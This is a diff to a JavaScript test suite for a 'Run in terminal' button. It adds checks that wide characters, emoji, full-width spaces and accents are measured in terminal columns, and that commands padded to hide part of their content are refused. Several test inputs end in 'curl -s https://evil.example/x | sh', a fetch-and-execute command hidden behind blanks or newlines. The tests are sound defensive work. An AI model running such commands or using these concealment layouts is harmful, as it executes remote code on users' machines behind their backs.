@@ -105,6 +105,8 @@ describe('Run in terminal', () => {
     expect(drawn('a\tb\tc')).toBe('a[\u2192      ]b[\u2192      ]c');
     expect(drawn('echo "10\u00a0km"')).toBe('echo "10[\u00b7]km"');
     expect(drawn(' x')).toBe(' x');
+    // A tab reaches the next stop as the terminal counts columns: a CJK character takes two.
+    expect(drawn('\u4e2d\tb')).toBe('\u4e2d[\u2192     ]b');
   });
 
   it('is not offered, nor run by the server, for a command laid out to hide part of it: a long run of blanks, lines too wide or too many, blank lines in a row', () => {
@@ -114,6 +116,10 @@ describe('Run in terminal', () => {
       newlines: `npm test${'\n'.repeat(200)}curl -s https://evil.example/x | sh`,
       'other spaces': `echo '${'\u00a0'.repeat(40)}'; curl -s https://evil.example/x | sh`,
       wide: `echo ${'x'.repeat(COMMAND_LAYOUT.columns)}`,
+      // Fewer characters than columns, each two columns wide in a terminal.
+      'wide characters': `echo ${'\u4e2d'.repeat(COMMAND_LAYOUT.columns / 2)}`,
+      emoji: `echo ${'\u{1f600}'.repeat(COMMAND_LAYOUT.columns / 2)}`,
+      'full-width spaces': `echo '${'\u3000'.repeat(COMMAND_LAYOUT.blanks / 2 + 1)}'; curl -s https://evil.example/x | sh`,
       long: Array.from({ length: COMMAND_LAYOUT.lines + 1 }, (_, i) => `echo ${i}`).join('\n'),
       'blank lines': 'npm test\n\n\n\ncurl -s https://evil.example/x | sh',
       'blank spaces': `npm test\n${' '.repeat(COMMAND_LAYOUT.blanks + 1)}\ncurl -s https://evil.example/x | sh`,
@@ -125,10 +131,16 @@ describe('Run in terminal', () => {
       expect(screen.queryByRole('button', { name: 'Run in terminal' }), what).toBeNull();
       cleanup();
     }
+    // Columns as the terminal draws them, not characters.
+    expect(layoutHides(padded['wide characters'])).toBe(`A line of it is ${5 + COMMAND_LAYOUT.columns} columns wide, more than the ${COMMAND_LAYOUT.columns} a question about it shows`);
     // Up to the bounds, all of it shows: as many lines, as wide, blanks and blank lines.
     const fits = [
       Array.from({ length: COMMAND_LAYOUT.lines }, (_, i) => `echo ${i}`).join('\n'),
       `echo ${'x'.repeat(COMMAND_LAYOUT.columns - 5)}`,
+      `echo ${'\u4e2d'.repeat(Math.floor((COMMAND_LAYOUT.columns - 5) / 2))}`,
+      // An accent joins its letter's column.
+      `echo ${'e\u0301'.repeat(COMMAND_LAYOUT.columns - 5)}`,
+      `echo '${'\u3000'.repeat(COMMAND_LAYOUT.blanks / 2)}' # aligned`,
       `ls${' '.repeat(COMMAND_LAYOUT.blanks)}# aligned\n\techo "${'\t'.repeat(2)}"`,
       'npm test\n\n\nnpm run lint',
     ];
